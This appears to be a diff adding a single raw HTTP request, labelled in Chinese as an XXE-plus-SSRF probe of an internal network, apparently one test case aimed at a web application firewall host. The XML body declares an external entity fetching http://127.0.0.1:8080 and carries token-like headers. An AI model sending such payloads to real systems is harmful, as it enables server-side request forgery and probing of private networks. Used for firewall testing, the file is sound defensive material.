@@ -1,0 +1,15 @@
+# XML外部实体注入_信息探测_HTTP协议
+# 基于HTTP协议，结合XXE和SSRF漏洞对内网进行信息探测
+POST /?bid=hd_tag_m8mv24mm HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mm
+RM-PRO-Token: e2d15368cab83dfd41fd11d3748ab6b4
+RM-PRO-Time: 1742808392948
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "http://127.0.0.1:8080" >]>
+<name>&xxe;</name>
